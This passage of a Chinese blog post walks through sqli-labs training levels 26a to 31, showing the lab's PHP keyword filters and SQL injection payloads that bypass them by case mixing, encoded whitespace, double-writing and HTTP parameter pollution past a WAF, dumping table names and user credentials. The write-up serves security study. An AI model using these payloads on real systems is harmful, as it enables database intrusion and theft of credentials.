+    <a href="#less-26a-get---blind-based---all-your-spaces-and-comments-belong-to-us" class="header-mark"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us</h3><p>过滤了空格和注释的盲注</p>
+<p>关闭了详细的报错，可进行盲注，闭合使用<code>')</code></p>
+<p>payload类似上题</p>
+<h3 id="less-27-get---error-based--all-your-union--select-belong-to-us" class="headerLink">
+    <a href="#less-27-get---error-based--all-your-union--select-belong-to-us" class="header-mark"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us</h3><p>过滤了union和select的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">blacklist</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\*]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//strip out /*
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[--]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//Strip out --.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[#]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>			<span class="c1">//Strip out #.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[ +]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out spaces.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/select/m&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out spaces.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[ +]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out spaces.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/union/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out union
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/select/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out select
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/UNION/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out UNION
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/SELECT/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out SELECT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/Union/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out Union
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/Select/s&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>	    <span class="c1">//Strip out select
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">大小写绕过	seleCt UniOn
+</span></span><span class="line"><span class="cl">空格	/*%0a*/ 或者 %0a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">爆库:
+</span></span><span class="line"><span class="cl">0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,database(),2/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">爆表:
+</span></span><span class="line"><span class="cl">0&#39;%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#39;security&#39;),3||&#39;1
+</span></span><span class="line"><span class="cl">爆字段:
+</span></span><span class="line"><span class="cl">0&#39;%0buniOn%0bsElEct%0b1,(group_concat(column_name)),3%0bfrom%0binformation_schema.columns%0bwhere%0btable_schema=&#39;security&#39;%0bAnd%0btable_name=&#39;users&#39;%0b%26%26%0b&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">爆数据:
+</span></span><span class="line"><span class="cl">0&#39;/*%0a*/UnIoN/*%0a*/SeLeCt/*%0a*/1,(SeLeCt/*%0a*/group_concat(concat_ws(&#39;$&#39;,id,username,password))/*%0a*/from/*%0a*/users),3/*%0a*/||/*%0a*/&#39;1&#39;=&#39;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-27a-get---blind-based--all-your-union--select-belong-to-us" class="headerLink">
+    <a href="#less-27a-get---blind-based--all-your-union--select-belong-to-us" class="header-mark"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><p>盲注，过滤了union和select</p>
+<p>双引号进行闭合，bypass方式同上</p>
+<h3 id="less-28-get---error-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis" class="headerLink">
+    <a href="#less-28-get---error-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis" class="header-mark"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis</h3><p>基于错误的，有括号的单引号字符型，过滤了union和select等的注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">blacklist</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 /*
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\*]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 - # 注释
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[--]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[#]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 空格 +
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[ +]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 过滤 union select /i 大小写都过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/union\s+select/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>过滤了相连的 union 加 空格 加 select，同时匹配大小写</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#双写绕过
+</span></span><span class="line"><span class="cl">?id=0&#39;)uni union%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#39;security&#39;and (&#39;1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#或者
+</span></span><span class="line"><span class="cl">?id=0&#39;)%0buniOn%0bsElEct%0b1,database(),3%0bor%0b(&#39;1&#39;)=(&#39;1 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-28a-get---bind-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis" class="headerLink">
+    <a href="#less-28a-get---bind-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis" class="header-mark"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis</h3><p>基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</p>
+<p>只过滤了union select</p>
+<p>绕过方式同上题</p>
+<h3 id="less-29-get--error-based--impidence-mismatch--having-a-waf-in-front-of-web-application" class="headerLink">
+    <a href="#less-29-get--error-based--impidence-mismatch--having-a-waf-in-front-of-web-application" class="header-mark"></a>Less-29 GET -Error based- IMPIDENCE MISMATCH- Having a WAF in front of web application.</h3><p>基于WAF的一个错误</p>
+<p>服务器架构</p>
+<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241127111831331.png" title="image-20241127111831331" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241127111831331.png">
+        <img
+            
+            loading="lazy"
+            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241127111831331.png"
+            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241127111831331.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241127111831331.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241127111831331.png 2x"
+            sizes="auto"
+            alt="image-20241127111831331">
+    </a></figure></p>
+<p>client 访问服务器，能直接访问到 Tomcat 服务器，然后 tomcat 服务器在向 Apache 服务器请求数据，数据返回路径刚好相反</p>
+<p>HTTP参数污染</p>
+<p>不同的中间件在处理参数重复问题解析到的参数不同</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">e.g. index.php?id=1&amp;id=2
+</span></span><span class="line"><span class="cl">apache(php)解析最后一个参数,即回显id=2
+</span></span><span class="line"><span class="cl">而tomcat(jsp)解析第一个参数,即回显id=1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png" title="image-20220317222232693" data-thumbnail="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png">
+        <img
+            
+            loading="lazy"
+            src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png"
+            srcset="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png, https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png 1.5x, https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203172222840.png 2x"
+            sizes="auto"
+            alt="image-20220317222232693">
+    </a></figure></p>
+<p>在本题目当中，waf在tomcat，对第一个参数进行了过滤，二apache解析的是第二个参数</p>
+<p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#爆表
+</span></span><span class="line"><span class="cl">?id=1&amp;id=-2%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#爆字段
+</span></span><span class="line"><span class="cl">?id=1&amp;id=-2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database() and table_name=&#39;users&#39;--+
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">#爆密码账户
+</span></span><span class="line"><span class="cl">?id=1&amp;id=-2%27%20union%20select%201,group_concat(password,username),3%20from%20users--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-30-get-blind-havaing-with-waf" class="headerLink">
+    <a href="#less-30-get-blind-havaing-with-waf" class="header-mark"></a>Less-30 Get-Blind Havaing with WAF</h3><p>同上题，闭合方式变为双引号</p>
+<h3 id="less-31-protection-with-waf" class="headerLink">
+    <a href="#less-31-protection-with-waf" class="header-mark"></a>Less-31 Protection with WAF</h3><p>bypass同上，闭合方式变为<code>&quot;)</code></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-11-17</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/sqli-labs_4_bypass/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_4_bypass.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\sqli-labs_4_bypass.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20sqli-labs%E9%9D%B6%E5%9C%BA%284%29%E7%BB%95%E8%BF%87&body=|Field|Value|%0A|-|-|%0A|Title|sqli-labs%E9%9D%B6%E5%9C%BA%284%29%E7%BB%95%E8%BF%87|%0A|Url|http://scofield1920.github.io/sqli-labs_4_bypass/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_4_bypass.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/sqli-labs_4_bypass/" data-title="sqli-labs靶场(4)绕过" data-hashtags="web,wp,sqli"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/sqli-labs_4_bypass/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/sqli-labs_4_bypass/" data-title="sqli-labs靶场(4)绕过"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/sqli-labs_4_bypass/" data-title="sqli-labs靶场(4)绕过"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/sqli-labs_4_bypass/" data-title="sqli-labs靶场(4)绕过"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/sqli-labs_4_bypass/" data-title="sqli-labs靶场(4)绕过" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;sqli-labs靶场(4)绕过&#34;, &#34;http://scofield1920.github.io/sqli-labs_4_bypass/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/wp/">Wp</a>,&nbsp;<a href="/tags/sqli/">Sqli</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sqli-labs_5_wchar/" class="prev" rel="prev" title="sqli-labs靶场(5)宽字节注入"><i class="fas fa-angle-left fa-fw"></i>sqli-labs靶场(5)宽字节注入</a>
+            <a href="/sqli-labs_3_post_head/" class="next" rel="next" title="sqli-labs靶场(3)POST头部注入">sqli-labs靶场(3)POST头部注入<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
